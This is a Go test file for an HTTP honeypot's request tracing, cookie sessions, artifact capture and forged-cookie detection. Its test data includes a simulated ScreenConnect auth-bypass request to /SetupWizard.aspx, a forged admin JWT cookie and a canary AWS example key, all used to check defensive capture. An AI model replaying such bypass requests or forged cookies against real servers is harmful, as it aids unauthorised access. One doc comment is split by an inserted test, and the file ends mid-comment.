package HTTP

import (
	"context"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/beelzebub-labs/beelzebub/v3/internal/artifactstore"
	"github.com/beelzebub-labs/beelzebub/v3/internal/historystore"
	"github.com/beelzebub-labs/beelzebub/v3/internal/parser"
	"github.com/beelzebub-labs/beelzebub/v3/internal/plugins"
	"github.com/beelzebub-labs/beelzebub/v3/internal/tracer"
)

// captureTracer is a tracer.Tracer implementation that records every
// emitted event in-memory for test assertions.
type captureTracer struct {
	mu     sync.Mutex
	events []tracer.Event
}

func (c *captureTracer) TraceEvent(e tracer.Event) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.events = append(c.events, e)
}

func (c *captureTracer) last() tracer.Event {
	c.mu.Lock()
	defer c.mu.Unlock()
	if len(c.events) == 0 {
		return tracer.Event{}
	}
	return c.events[len(c.events)-1]
}

// stubAddr lets us seed an http.Request's LocalAddrContextKey so the
// destPort extraction inside traceRequest doesn't fall over.
type stubAddr struct{ s string }

func (a *stubAddr) Network() string { return "tcp" }
func (a *stubAddr) String() string  { return a.s }

// newTestRequest builds a minimal *http.Request that traceRequest can
// process without blowing up on missing context (TeeConn, dest port).
func newTestRequest(t *testing.T) *http.Request {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.RemoteAddr = "203.0.113.42:54321"
	ctx := context.WithValue(req.Context(), http.LocalAddrContextKey,
		net.Addr(&stubAddr{s: "127.0.0.1:8888"}))
	return req.WithContext(ctx)
}

// TestTraceRequest_ResponseBodyCapturedWhenFlagOn — Threat A/H: when
// captureResponseBody=true, the served body must appear in
// event.ResponseBody verbatim, ResponseHeaders is filled, and
// ResponseBytes/ResponseTimeMs/ResponseStatusCode are set.
func TestTraceRequest_ResponseBodyCapturedWhenFlagOn(t *testing.T) {
	tt := &captureTracer{}
	req := newTestRequest(t)
	cmd := parser.Command{Name: "test-handler"}
	respBody := `{"id":"chatcmpl-x","model":"llama3.1:8b-instruct-q8_0",` +
		`"choices":[{"message":{"content":"llama3.1:8b-instruct-q8_0"}}]}`
	respHeaders := "Content-Type: application/json, Server: uvicorn"

	traceRequest(req, tt, cmd,
		"OpenAI-compatible inference API", "openai-compat",
		"" /* request body */, nil, /* novelty store */
		respBody, 200, respHeaders,
		true /* captureResponseBody */, 0 /* default 64KiB */, 42, /* responseTimeMs */
		false /* captureRequestBody */, 0, /* requestBodyMaxBytes */
		nil /* captured */, "" /* sessionKeyOverride */, "" /* handlerOverride */)

	got := tt.last()
	if got.ResponseBody != respBody {
		t.Fatalf("ResponseBody not captured.\n  want: %q\n  got:  %q", respBody, got.ResponseBody)
	}
	if got.ResponseHeaders != respHeaders {
		t.Errorf("ResponseHeaders mismatch.\n  want: %q\n  got:  %q", respHeaders, got.ResponseHeaders)
	}
	if got.ResponseBytes != int64(len(respBody)) {
		t.Errorf("ResponseBytes: want %d, got %d", len(respBody), got.ResponseBytes)
	}
	if got.ResponseTimeMs != 42 {
		t.Errorf("ResponseTimeMs: want 42, got %d", got.ResponseTimeMs)
	}
	if got.ResponseStatusCode != 200 {
		t.Errorf("ResponseStatusCode: want 200, got %d", got.ResponseStatusCode)
	}
}

// TestTraceRequest_ResponseBodyOmittedWhenFlagOff — Threat A defense in
// depth: when captureResponseBody=false (default), ResponseBody and
// ResponseHeaders must be empty, but ResponseBytes (count) and
// ResponseTimeMs are still populated.
func TestTraceRequest_ResponseBodyOmittedWhenFlagOff(t *testing.T) {
	tt := &captureTracer{}
	req := newTestRequest(t)
	cmd := parser.Command{Name: "test-handler"}
	respBody := "AKIAIOSFODNN7EXAMPLE leaks here when flag is off — should NOT land in ResponseBody"

	traceRequest(req, tt, cmd, "desc", "svc", "", nil,
		respBody, 200, "Content-Type: text/plain",
		false /* captureResponseBody OFF */, 0, 5,
		false, 0,
		nil, "", "")

	got := tt.last()
	if got.ResponseBody != "" {
		t.Fatalf("ResponseBody must be empty when flag off; got %q", got.ResponseBody)
	}
	if got.ResponseHeaders != "" {
		t.Errorf("ResponseHeaders must be empty when flag off; got %q", got.ResponseHeaders)
	}
	if got.ResponseBytes != int64(len(respBody)) {
		t.Errorf("ResponseBytes still expected (count is harmless): want %d, got %d",
			len(respBody), got.ResponseBytes)
	}
	if got.ResponseTimeMs != 5 {
		t.Errorf("ResponseTimeMs always populated: want 5, got %d", got.ResponseTimeMs)
	}
}

// TestTraceRequest_ResponseBodyTruncatedAtMax — bounded storage:
// captureResponseBody=true with a small max truncates the body, but
// ResponseBytes still reports the FULL pre-truncation byte count.
func TestTraceRequest_ResponseBodyTruncatedAtMax(t *testing.T) {
	tt := &captureTracer{}
	req := newTestRequest(t)
	cmd := parser.Command{Name: "test-handler"}
	respBody := strings.Repeat("A", 500)
	maxBytes := 100

	traceRequest(req, tt, cmd, "desc", "svc", "", nil,
		respBody, 200, "Content-Type: text/plain",
		true, maxBytes, 1,
		false, 0,
		nil, "", "")

	got := tt.last()
	if len(got.ResponseBody) != maxBytes {
		t.Fatalf("ResponseBody truncation: want exactly %d bytes, got %d",
			maxBytes, len(got.ResponseBody))
	}
	if got.ResponseBytes != int64(len(respBody)) {
		t.Errorf("ResponseBytes must reflect full pre-truncation size: want %d, got %d",
			len(respBody), got.ResponseBytes)
	}
}

// TestTraceRequest_DefaultMaxAppliedWhenZero — when responseBodyMaxBytes=0
// (operator left the YAML field unset), the runtime default of 64 KiB
// applies.
func TestTraceRequest_DefaultMaxAppliedWhenZero(t *testing.T) {
	tt := &captureTracer{}
	req := newTestRequest(t)
	cmd := parser.Command{Name: "test-handler"}
	respBody := strings.Repeat("X", 64*1024+10) // 10 bytes over default

	traceRequest(req, tt, cmd, "desc", "svc", "", nil,
		respBody, 200, "",
		true, 0 /* zero → use default 64 KiB */, 1,
		false, 0,
		nil, "", "")

	got := tt.last()
	if len(got.ResponseBody) != defaultResponseBodyMaxBytes {
		t.Fatalf("default max not applied: want %d, got %d",
			defaultResponseBodyMaxBytes, len(got.ResponseBody))
	}
	if got.ResponseBytes != int64(len(respBody)) {
		t.Errorf("ResponseBytes must reflect untruncated count: want %d, got %d",
			len(respBody), got.ResponseBytes)
	}
}

// TestTraceRequest_ResponseTimeAlwaysPopulated — even when capture is OFF,
// ResponseTimeMs is populated. Universal signal, no canary leak risk.
func TestTraceRequest_ResponseTimeAlwaysPopulated(t *testing.T) {
	tt := &captureTracer{}
	req := newTestRequest(t)
	cmd := parser.Command{Name: "test-handler"}

	for _, capture := range []bool{true, false} {
		traceRequest(req, tt, cmd, "desc", "svc", "", nil,
			"x", 200, "", capture, 64*1024, 7,
			false, 0,
			nil, "", "")
		got := tt.last()
		if got.ResponseTimeMs != 7 {
			t.Errorf("captureResponseBody=%v: ResponseTimeMs not populated (got %d)",
				capture, got.ResponseTimeMs)
		}
	}
}

// TestTraceRequest_RequestBodyCapturedWhenFlagOn — symmetric to ResponseBody
// capture: when captureRequestBody=true the dedicated RequestBody field is
// populated verbatim (under the truncation cap).
func TestTraceRequest_RequestBodyCapturedWhenFlagOn(t *testing.T) {
	tt := &captureTracer{}
	req := newTestRequest(t)
	cmd := parser.Command{Name: "test-handler"}
	reqBody := `{"messages":[{"role":"user","content":"prompt with embedded canary AKIA..."}]}`

	traceRequest(req, tt, cmd, "desc", "svc",
		reqBody /* request body */, nil,
		"resp", 200, "",
		false /* captureResponseBody */, 0, 1,
		true /* captureRequestBody */, 0, /* default 64KiB */
		nil, "", "")

	got := tt.last()
	if got.RequestBody != reqBody {
		t.Fatalf("RequestBody not captured.\n  want: %q\n  got:  %q", reqBody, got.RequestBody)
	}
}

// TestTraceRequest_RequestBodyOmittedWhenFlagOff — opt-in default: when
// captureRequestBody=false, the RequestBody field stays empty even when a
// request body is present (the legacy Body field handles backwards compat).
func TestTraceRequest_RequestBodyOmittedWhenFlagOff(t *testing.T) {
	tt := &captureTracer{}
	req := newTestRequest(t)
	cmd := parser.Command{Name: "test-handler"}
	reqBody := "AKIAIOSFODNN7EXAMPLE leaks here when flag is off — should NOT land in RequestBody"

	traceRequest(req, tt, cmd, "desc", "svc", reqBody, nil,
		"resp", 200, "",
		false, 0, 1,
		false /* captureRequestBody OFF */, 0,
		nil, "", "")

	got := tt.last()
	if got.RequestBody != "" {
		t.Fatalf("RequestBody must be empty when flag off; got %q", got.RequestBody)
	}
	// Legacy Body field still populated for backwards-compat.
	if got.Body != reqBody {
		t.Errorf("legacy Body field should still be set; want %q, got %q", reqBody, got.Body)
	}
}

// TestTraceRequest_RequestBodyTruncatedAtMax — when the request body exceeds
// requestBodyMaxBytes, the captured RequestBody is exactly truncated.
func TestTraceRequest_RequestBodyTruncatedAtMax(t *testing.T) {
	tt := &captureTracer{}
	req := newTestRequest(t)
	cmd := parser.Command{Name: "test-handler"}
	reqBody := strings.Repeat("Q", 500)
	maxBytes := 100

	traceRequest(req, tt, cmd, "desc", "svc", reqBody, nil,
		"resp", 200, "",
		false, 0, 1,
		true, maxBytes,
		nil, "", "")

	got := tt.last()
	if len(got.RequestBody) != maxBytes {
		t.Fatalf("RequestBody truncation: want exactly %d bytes, got %d",
			maxBytes, len(got.RequestBody))
	}
}

// TestTraceRequest_RequestBodyDefaultMaxAppliedWhenZero — zero
// requestBodyMaxBytes with captureRequestBody=true falls back to the runtime
// default (64 KiB).
func TestTraceRequest_RequestBodyDefaultMaxAppliedWhenZero(t *testing.T) {
	tt := &captureTracer{}
	req := newTestRequest(t)
	cmd := parser.Command{Name: "test-handler"}
	reqBody := strings.Repeat("Y", 64*1024+50)

	traceRequest(req, tt, cmd, "desc", "svc", reqBody, nil,
		"resp", 200, "",
		false, 0, 1,
		true, 0, /* zero → default */
		nil, "", "")

	got := tt.last()
	if len(got.RequestBody) != defaultRequestBodyMaxBytes {
		t.Fatalf("default request body max not applied: want %d, got %d",
			defaultRequestBodyMaxBytes, len(got.RequestBody))
	}
}

// TestBuildHTTPResponse_RequestBodyCapturedFromServiceConfig — end-to-end
// strategy-level test: setting CaptureRequestBody on the service config
// surfaces the truncated RequestBody on the tracer event.
func TestBuildHTTPResponse_RequestBodyCapturedFromServiceConfig(t *testing.T) {
	cookieStore := historystore.NewCookieSessionStore(time.Hour)
	defer cookieStore.Stop()
	sctx := &sessionContext{cookieStore: cookieStore, cookieName: ".X", ttlSeconds: 1800}

	body := strings.Repeat("Z", 200)
	req := httptest.NewRequest(http.MethodPost, "/v1/chat/completions", strings.NewReader(body))
	req.RemoteAddr = "203.0.113.5:1234"
	ctx := context.WithValue(req.Context(), http.LocalAddrContextKey,
		net.Addr(&stubAddr{s: "127.0.0.1:4000"}))
	req = req.WithContext(ctx)

	cmd := parser.Command{Name: "litellm/chat", StatusCode: 200, Handler: "{}"}
	tt := &captureTracer{}
	servConf := parser.BeelzebubServiceConfiguration{
		ServiceType:         "litellm",
		CaptureRequestBody:  true,
		RequestBodyMaxBytes: 50,
		State:               &parser.State{CookieName: ".X", TTLSeconds: 1800},
	}
	resp, err, fireTrace := buildHTTPResponse(servConf, tt, cmd, req, nil, sctx, nil)
	if err != nil {
		t.Fatal(err)
	}
	fireTrace(&resp)
	got := tt.last()
	if len(got.RequestBody) != 50 {
		t.Fatalf("RequestBody truncation via servConf: want 50 bytes, got %d (%q)",
			len(got.RequestBody), got.RequestBody)
	}
	if got.RequestBody != strings.Repeat("Z", 50) {
		t.Errorf("RequestBody content mismatch: %q", got.RequestBody)
	}
}

func TestHTTP_SessionCreateSetsCookieAndCaptures(t *testing.T) {
	cookieStore := historystore.NewCookieSessionStore(10 * time.Minute)
	defer cookieStore.Stop()

	sctx := &sessionContext{
		cookieStore: cookieStore,
		cookieName:  ".ASPXAUTH",
		ttlSeconds:  600,
	}

	cmd := parser.Command{
		Name:          "screenconnect/auth_bypass",
		StatusCode:    302,
		SessionAction: "create",
		SessionCapture: map[string]string{
			"screenconnect.operator_user": `<Username>([^<]+)</Username>`,
		},
	}

	body := strings.NewReader(`<SetupWizard><Username>pwn</Username></SetupWizard>`)
	req := httptest.NewRequest(http.MethodPost, "/SetupWizard.aspx", body)
	req.RemoteAddr = "203.0.113.42:54321"
	ctx := context.WithValue(req.Context(), http.LocalAddrContextKey,
		net.Addr(&stubAddr{s: "127.0.0.1:8042"}))
	req = req.WithContext(ctx)

	tt := &captureTracer{}
	servConf := parser.BeelzebubServiceConfiguration{
		Description: "screenconnect",
		ServiceType: "screenconnect",
		State:       &parser.State{CookieName: ".ASPXAUTH", TTLSeconds: 600},
	}

	resp, err, fireTrace := buildHTTPResponse(servConf, tt, cmd, req, nil, sctx, nil)
	if err != nil {
		t.Fatal(err)
	}

	fireTrace(&resp)

	// Set-Cookie header must be injected into resp.Headers.
	foundSetCookie := false
	for _, h := range resp.Headers {
		if strings.HasPrefix(h, "Set-Cookie:") && strings.Contains(h, ".ASPXAUTH=") {
			foundSetCookie = true
		}
	}
	if !foundSetCookie {
		t.Fatalf("missing Set-Cookie in resp.Headers: %v", resp.Headers)
	}

	// Cookie store must have exactly one live session.
	if cookieStore.Len() != 1 {
		t.Fatalf("expected 1 cookie session, got %d", cookieStore.Len())
	}

	// Tracer event must carry the captured operator_user field.
	got := tt.last()
	if got.Captured["screenconnect.operator_user"] != "pwn" {
		t.Fatalf("Captured[screenconnect.operator_user] not set correctly: %+v", got.Captured)
	}

	// SessionKey must be overridden to cookie[:16], not the default "HTTP"+ip form.
	if got.SessionKey == "HTTP203.0.113.42" || len(got.SessionKey) != 16 {
		t.Fatalf("SessionKey not overridden to cookie key: %q", got.SessionKey)
	}
}

// TestHTTP_SessionRequireRejectsUnauthed verifies that sessionAction:require
// returns 401 Unauthorized when no live session cookie is present, and that the
// tracer event still fires (recording the rejection).
func TestHTTP_SessionRequireRejectsUnauthed(t *testing.T) {
	cookieStore := historystore.NewCookieSessionStore(10 * time.Minute)
	defer cookieStore.Stop()

	// sctx has no live session (sess == nil).
	sctx := &sessionContext{
		cookieStore: cookieStore,
		cookieName:  ".ASPXAUTH",
		ttlSeconds:  600,
	}

	cmd := parser.Command{
		Name:          "screenconnect/dashboard",
		StatusCode:    200,
		Handler:       "Welcome, ${captured.screenconnect.operator_user}",
		SessionAction: "require",
	}

	req := httptest.NewRequest(http.MethodGet, "/Administration", nil)
	req.RemoteAddr = "203.0.113.99:12345"
	ctx := context.WithValue(req.Context(), http.LocalAddrContextKey,
		net.Addr(&stubAddr{s: "127.0.0.1:8042"}))
	req = req.WithContext(ctx)

	tt := &captureTracer{}
	servConf := parser.BeelzebubServiceConfiguration{
		Description: "screenconnect",
		ServiceType: "screenconnect",
		State:       &parser.State{CookieName: ".ASPXAUTH", TTLSeconds: 600},
	}

	resp, err, fireTrace := buildHTTPResponse(servConf, tt, cmd, req, nil, sctx, nil)
	if err != nil {
		t.Fatal(err)
	}

	fireTrace(&resp)

	if resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("expected 401 Unauthorized, got %d", resp.StatusCode)
	}
	if resp.Body != "Unauthorized" {
		t.Fatalf("expected body %q, got %q", "Unauthorized", resp.Body)
	}
	// Tracer must still fire even on the 401 path.
	got := tt.last()
	if got.ResponseStatusCode != http.StatusUnauthorized {
		t.Fatalf("tracer event ResponseStatusCode: want 401, got %d", got.ResponseStatusCode)
	}
}

// TestHTTP_ArtifactCaptureWritesAndAddsSHA verifies that ArtifactCapture:true
// writes the request body to the artifact store and adds artifact_sha256 to the
// tracer event's Captured map. Uses t.TempDir() so no cleanup is needed.
func TestHTTP_ArtifactCaptureWritesAndAddsSHA(t *testing.T) {
	dir := t.TempDir()

	cookieStore := historystore.NewCookieSessionStore(10 * time.Minute)
	defer cookieStore.Stop()

	// Pre-create a session so sess != nil (required by ArtifactCapture path).
	sess := cookieStore.Create("203.0.113.7", "", map[string]string{"src": "test"})

	astore := artifactstore.New(dir, 0 /* no size limit */)
	sctx := &sessionContext{
		sess:          sess,
		cookieStore:   cookieStore,
		artifactStore: astore,
		cookieName:    ".ASPXAUTH",
		ttlSeconds:    600,
	}

	payload := []byte(`GET /secret HTTP/1.1\r\nHost: target\r\n\r\n`)
	cmd := parser.Command{
		Name:            "capture-payload",
		StatusCode:      200,
		Handler:         "ok",
		ArtifactCapture: true,
	}

	req := httptest.NewRequest(http.MethodPost, "/upload", strings.NewReader(string(payload)))
	req.RemoteAddr = "203.0.113.7:9999"
	ctx := context.WithValue(req.Context(), http.LocalAddrContextKey,
		net.Addr(&stubAddr{s: "127.0.0.1:8042"}))
	req = req.WithContext(ctx)

	tt := &captureTracer{}
	servConf := parser.BeelzebubServiceConfiguration{
		Description: "capture-lure",
		ServiceType: "capture",
		State: &parser.State{
			CookieName:   ".ASPXAUTH",
			TTLSeconds:   600,
			ArtifactPath: dir,
		},
	}

	resp, err, fireTrace := buildHTTPResponse(servConf, tt, cmd, req, nil, sctx, nil)
	if err != nil {
		t.Fatal(err)
	}

	fireTrace(&resp)

	// Tracer event must have artifact_sha256 set.
	got := tt.last()
	sha, ok := got.Captured["artifact_sha256"]
	if !ok || sha == "" {
		t.Fatalf("artifact_sha256 not in event.Captured: %+v", got.Captured)
	}

	// The .bin file must exist in the artifact directory.
	binPath := strings.Join([]string{dir, sha + ".bin"}, string(os.PathSeparator))
	if _, statErr := os.Stat(binPath); statErr != nil {
		t.Fatalf("artifact .bin file not found at %s: %v", binPath, statErr)
	}
}

func TestHTTP_RawBodyFirst8KB(t *testing.T) {
	cookieStore := historystore.NewCookieSessionStore(time.Hour)
	defer cookieStore.Stop()
	sctx := &sessionContext{cookieStore: cookieStore, cookieName: ".X", ttlSeconds: 1800}

	body := strings.Repeat("A", 10000) // 10 KB body
	req := httptest.NewRequest(http.MethodPost, "/x", strings.NewReader(body))
	req.RemoteAddr = "203.0.113.1:1234"
	ctx := context.WithValue(req.Context(), http.LocalAddrContextKey,
		net.Addr(&stubAddr{s: "127.0.0.1:8042"}))
	req = req.WithContext(ctx)

	cmd := parser.Command{Name: "svc/handler"}
	tt := &captureTracer{}
	servConf := parser.BeelzebubServiceConfiguration{
		ServiceType: "svc",
		State:       &parser.State{CookieName: ".X", TTLSeconds: 1800},
	}
	resp, err, fireTrace := buildHTTPResponse(servConf, tt, cmd, req, nil, sctx, nil)
	if err != nil {
		t.Fatal(err)
	}
	fireTrace(&resp)
	got := tt.last()
	raw, ok := got.Captured["svc.raw_body_first_8kb"]
	if !ok {
		t.Fatalf("svc.raw_body_first_8kb not in Captured: %+v", got.Captured)
	}
	if len(raw) != 8192 {
		t.Errorf("raw body should be capped at 8192 bytes, got %d", len(raw))
	}
	if raw != strings.Repeat("A", 8192) {
		t.Error("raw body content mismatch (truncation produced wrong bytes)")
	}
}

// TestHTTP_HeaderCaptures verifies that Referer, X-Forwarded-For, and
// User-Agent headers are captured under <svc>-namespaced keys when sctx != nil.
func TestHTTP_HeaderCaptures(t *testing.T) {
	cookieStore := historystore.NewCookieSessionStore(time.Hour)
	defer cookieStore.Stop()
	sctx := &sessionContext{cookieStore: cookieStore, cookieName: ".X", ttlSeconds: 1800}

	req := httptest.NewRequest(http.MethodGet, "/x", nil)
	req.RemoteAddr = "203.0.113.1:1234"
	req.Header.Set("Referer", "https://example.com/path")
	req.Header.Set("X-Forwarded-For", "10.0.0.1, 192.168.1.1")
	req.Header.Set("User-Agent", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)")
	ctx := context.WithValue(req.Context(), http.LocalAddrContextKey,
		net.Addr(&stubAddr{s: "127.0.0.1:8042"}))
	req = req.WithContext(ctx)

	cmd := parser.Command{Name: "svc/recon"}
	tt := &captureTracer{}
	servConf := parser.BeelzebubServiceConfiguration{
		ServiceType: "svc",
		State:       &parser.State{CookieName: ".X", TTLSeconds: 1800},
	}
	resp, err, fireTrace := buildHTTPResponse(servConf, tt, cmd, req, nil, sctx, nil)
	if err != nil {
		t.Fatal(err)
	}
	fireTrace(&resp)
	got := tt.last()
	if got.Captured["svc.referer"] != "https://example.com/path" {
		t.Errorf("svc.referer mismatch: %q", got.Captured["svc.referer"])
	}
	if got.Captured["svc.xff"] != "10.0.0.1, 192.168.1.1" {
		t.Errorf("svc.xff mismatch: %q", got.Captured["svc.xff"])
	}
	if !strings.Contains(got.Captured["svc.user_agent_full"], "Nuclei") {
		t.Errorf("svc.user_agent_full missing Nuclei: %q", got.Captured["svc.user_agent_full"])
	}
}

// TestHTTP_CookieForgery_JWT verifies that when sctx carries a forged cookie
// classified as "jwt", the tracer event carries the correct Captured keys and
// the Handler is overridden to "<svc>/cookie_forgery".
func TestHTTP_CookieForgery_JWT(t *testing.T) {
	cookieStore := historystore.NewCookieSessionStore(time.Hour)
	defer cookieStore.Stop()

	// Forgery detection happens in the Init handler closure, not
	// buildHTTPResponse. Construct sctx with forgedShape pre-populated to
	// simulate what the handler closure would do.
	sctx := &sessionContext{
		cookieStore: cookieStore,
		cookieName:  ".X",
		ttlSeconds:  1800,
		forgedShape: "jwt",
		forgedValue: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.signature",
	}

	req := httptest.NewRequest(http.MethodGet, "/Host", nil)
	req.RemoteAddr = "203.0.113.1:1234"
	ctx := context.WithValue(req.Context(), http.LocalAddrContextKey,
		net.Addr(&stubAddr{s: "127.0.0.1:8042"}))
	req = req.WithContext(ctx)

	cmd := parser.Command{Name: "screenconnect/enum", SessionAction: "require"}
	tt := &captureTracer{}
	servConf := parser.BeelzebubServiceConfiguration{
		ServiceType: "screenconnect",
		State:       &parser.State{CookieName: ".X", TTLSeconds: 1800},
	}
	// Even though sessionAction is require and sess is nil (so we 401),
	// the forgery info must still appear in Captured.
	resp, err, fireTrace := buildHTTPResponse(servConf, tt, cmd, req, nil, sctx, nil)
	if err != nil {
		t.Fatal(err)
	}

	fireTrace(&resp)
	if resp.StatusCode != 401 {
		t.Errorf("expected 401 on require + no live session, got %d", resp.StatusCode)
	}
	got := tt.last()
	if got.Captured["screenconnect.forged_cookie_shape"] != "jwt" {
		t.Errorf("forged_cookie_shape: %q", got.Captured["screenconnect.forged_cookie_shape"])
	}
	if !strings.HasPrefix(got.Captured["screenconnect.forged_cookie_value"], "eyJhbGc") {
		t.Errorf("forged_cookie_value: %q", got.Captured["screenconnect.forged_cookie_value"])
	}
	// Handler must be overridden to <svc>/cookie_forgery.
	if got.Handler != "screenconnect/cookie_forgery" {
		t.Errorf("Handler should be overridden to screenconnect/cookie_forgery, got %q", got.Handler)
	}
}

// TestHTTP_CookieForgery_Classifier exercises classifyForgedCookie across a
// TestHTTP_LLMOfflineResponse_BackwardCompatBareText — when no llmOfflineResponse is
// configured on the lure (the legacy path for every existing service),
// the ExecuteModel-error fallback emits the bare-text 500 it always has.
// This is the backward-compat gate: stock services / non-LLM lures must
// see no behavior change from before this feature landed.
func TestHTTP_LLMOfflineResponse_BackwardCompatBareText(t *testing.T) {
	resp := httpResponse{StatusCode: 200, Body: "ignored"}
	applyLLMOfflineResponse(&resp, nil)
	if resp.StatusCode != 500 {
		t.Errorf("StatusCode = %d, want 500", resp.StatusCode)
	}
	if resp.Body != "500 Internal Server Error" {
		t.Errorf("Body = %q, want %q", resp.Body, "500 Internal Server Error")
	}
}

// TestHTTP_LLMOfflineResponse_PersonaShapedBodyOverrides — when the lure has
// llmOfflineResponse configured (LiteLLM / vLLM / Ollama persona-shaped JSON
// envelope), the configured Status + Body win verbatim. This is the
// motivated-actor probe path: hitting POST /v1/chat/completions without
// a working LLM should look like the impersonated service's real error,
// not bare text.
func TestHTTP_LLMOfflineResponse_PersonaShapedBodyOverrides(t *testing.T) {
	fb := &parser.LLMOfflineResponse{
		Status: 503,
		Body:   `{"error":{"message":"upstream timeout","type":"APIError","code":"503"}}`,
	}
	resp := httpResponse{StatusCode: 200, Body: "ignored"}
	applyLLMOfflineResponse(&resp, fb)
	if resp.StatusCode != 503 {
		t.Errorf("StatusCode = %d, want 503", resp.StatusCode)
	}
	if resp.Body != fb.Body {
		t.Errorf("Body = %q, want %q", resp.Body, fb.Body)
	}
}

// TestHTTP_LLMOfflineResponse_ZeroFieldsKeepLegacy — partial config support:
// status==0 keeps the 500 default, body=="" keeps the bare-text default.
// Lets a lure override one field without specifying the other.
func TestHTTP_LLMOfflineResponse_ZeroFieldsKeepLegacy(t *testing.T) {
	// status=0 + body set → custom body, default 500 status
	resp := httpResponse{}
	applyLLMOfflineResponse(&resp, &parser.LLMOfflineResponse{Body: `{"error":"x"}`})
	if resp.StatusCode != 500 {
		t.Errorf("StatusCode = %d, want 500 (default kept)", resp.StatusCode)
	}
	if resp.Body != `{"error":"x"}` {
		t.Errorf("Body = %q, want JSON envelope", resp.Body)
	}

	// status set + body empty → custom status, default bare text
	resp = httpResponse{}
	applyLLMOfflineResponse(&resp, &parser.LLMOfflineResponse{Status: 502})
	if resp.StatusCode != 502 {
		t.Errorf("StatusCode = %d, want 502", resp.StatusCode)
	}
	if resp.Body != "500 Internal Server Error" {
		t.Errorf("Body = %q, want bare text default", resp.Body)
	}
}

// representative set of inputs covering all shape branches and edge cases.
func TestHTTP_CookieForgery_Classifier(t *testing.T) {
	cases := []struct {
		in, want string
	}{
		{"", ""},
		{"x", ""}, // too short
		{"admin", "literal"},
		{"administrator", "literal"},
		{"shortgarbage_mixX!", ""},               // 18 chars, underscore+bang disqualify all shapes
		{"deadbeefdeadbeefdeadbeef", "hex"},      // 24-char hex (legit cookie is 64)
		{"eyJhbGc.eyJzdWI.signaturepart", "jwt"}, // 3 dots, base64url
		{"VGVzdEFkbWluUGFzc3dvcmQ=", "base64"},
	}
	for _, c := range cases {
		if got := classifyForgedCookie(c.in); got != c.want {
			t.Errorf("classifyForgedCookie(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// TestApplyResponseSubstitutions_RequestVarsUnconditional — request-level
// placeholders fire even with no session context. This is the path that
// closes the X-Request-Id cross-fleet fingerprint leak: every response
// must get a fresh per-request UUID regardless of statefulness.
func TestApplyResponseSubstitutions_RequestVarsUnconditional(t *testing.T) {
	resp := httpResponse{
		StatusCode: 200,
		Headers:    []string{"X-Request-Id: req_${request.uuid_short}"},
		Body:       `{"trace_id":"${request.uuid}","ts":${request.unix_ms}}`,
	}
	applyResponseSubstitutions(&resp, nil, nil)

	if strings.Contains(resp.Headers[0], "${request.uuid_short}") {
		t.Fatalf("uuid_short placeholder not substituted: %q", resp.Headers[0])
	}
	if !strings.HasPrefix(resp.Headers[0], "X-Request-Id: req_") {
		t.Fatalf("header prefix mangled: %q", resp.Headers[0])
	}
	// Suffix should be 8 hex chars from the dashed UUID.
	suffix := strings.TrimPrefix(resp.Headers[0], "X-Request-Id: req_")
	if len(suffix) != 8 {
		t.Errorf("uuid_short length = %d, want 8 (got %q)", len(suffix), suffix)
	}
	for _, c := range suffix {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
			t.Errorf("uuid_short non-hex char %q in %q", c, suffix)
			break
		}
	}
	if strings.Contains(resp.Body, "${request.uuid}") || strings.Contains(resp.Body, "${request.unix_ms}") {
		t.Errorf("body placeholders not substituted: %q", resp.Body)
	}
}

// TestApplyResponseSubstitutions_VariesAcrossInvocations — back-to-back
// calls must produce different uuid values. Same fingerprint check
// recongraph's sandbox_detect would run: identical responses across
// two probes = environment intercepting.
func TestApplyResponseSubstitutions_VariesAcrossInvocations(t *testing.T) {
	mk := func() string {
		r := httpResponse{Headers: []string{"X-Request-Id: ${request.uuid}"}}
		applyResponseSubstitutions(&r, nil, nil)
		return r.Headers[0]
	}
	a, b := mk(), mk()
	if a == b {
		t.Fatalf("two consecutive responses produced identical X-Request-Id: %q", a)
	}
}

// TestApplyResponseSubstitutions_SessionVarsStillWork — request vars must
// not regress the existing session.cookie / session.short / captured.*
// substitution path used by the stateful CVE-lure framework.
func TestApplyResponseSubstitutions_SessionVarsStillWork(t *testing.T) {
	cookieStore := historystore.NewCookieSessionStore(time.Hour)
	defer cookieStore.Stop()
	sess := cookieStore.Create("203.0.113.5", "ja4h", map[string]string{"role": "admin"})
	sctx := &sessionContext{cookieStore: cookieStore, sess: sess, cookieName: ".X", ttlSeconds: 1800}

	resp := httpResponse{
		Headers: []string{"X-Sess: ${session.short}"},
		Body:    `cookie=${session.cookie};role=${captured.role};req=${request.uuid_short}`,
	}
	applyResponseSubstitutions(&resp, sctx, nil)

	if !strings.HasPrefix(resp.Headers[0], "X-Sess: ") || strings.Contains(resp.Headers[0], "${") {
		t.Errorf("session header not substituted: %q", resp.Headers[0])
	}
	if !strings.Contains(resp.Body, "cookie="+sess.Cookie) {
		t.Errorf("session.cookie missing: %q", resp.Body)
	}
	if !strings.Contains(resp.Body, "role=admin") {
		t.Errorf("captured.role missing: %q", resp.Body)
	}
	if strings.Contains(resp.Body, "${request.uuid_short}") {
		t.Errorf("request.uuid_short not substituted alongside session vars: %q", resp.Body)
	}
}

// TestSetResponseHeaders_PreservesColonsInValue guards against a regression
// where a header value containing a colon (e.g. a URL with a port, or an
// error message with embedded colons) was truncated because the splitter
// split on every colon in the line instead of only the header-name
// separator.
func TestSetResponseHeaders_PreservesColonsInValue(t *testing.T) {
	headers := []string{
		"Server: uvicorn",
		"Location: https://example.com:8443/path",
		"X-Influxdb-Error: error parsing query: found NOT",
	}
	recorder := httptest.NewRecorder()

	setResponseHeaders(recorder, headers, http.StatusOK)

	tests := map[string]string{
		"Server":           "uvicorn",
		"Location":         "https://example.com:8443/path",
		"X-Influxdb-Error": "error parsing query: found NOT",
	}
	for key, want := range tests {
		got := recorder.Header().Get(key)
		if got != want {
			t.Errorf("header %q = %q, want %q", key, got, want)
		}
	}
}

// TestHTTP_MirrorTimingDelay locks Task 4's wire: buildHTTPResponse must sleep
// the MirrorDelayMs implied by a mirrored batch body before writing the mirror
